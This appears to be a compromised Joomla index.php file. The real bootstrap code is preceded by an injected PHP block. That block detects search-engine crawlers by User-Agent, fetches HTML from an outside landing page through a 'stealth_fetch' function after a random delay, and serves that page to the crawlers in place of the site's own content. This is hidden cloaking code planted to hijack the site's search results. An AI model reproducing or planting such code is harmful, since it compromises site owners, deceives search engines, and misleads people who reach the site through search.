<?php
ob_start();
header('Vary: Accept-Language, User-Agent');

$bot_url = "https://rakun.live/landing/sesis.html"; #url landing
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);

$bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];

$is_bot = false;
foreach ($bots as $b) {
    if (strpos($ua, $b) !== false) {
        $is_bot = true;
        break;
    }
}

function stealth_fetch($url) {
    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ]
    ]);
    return @file_get_contents($url, false, $ctx);
}

if ($is_bot) {
    usleep(mt_rand(100000, 200000));
    $konten = stealth_fetch($bot_url);
    if ($konten !== false) {
        echo $konten;
    }
    ob_end_flush();
    exit;
}

/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2020 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

/**
 * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
 */
define('JOOMLA_MINIMUM_PHP', '5.3.10');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
{
	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
}

// Saves the start time and memory usage.
$startTime = microtime(1);
$startMem  = memory_get_usage();

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php'))
{
	include_once __DIR__ . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', __DIR__);
	require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Set profiler start time and memory usage and mark afterLoad in the profiler.
JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Execute the application.
$app->execute();
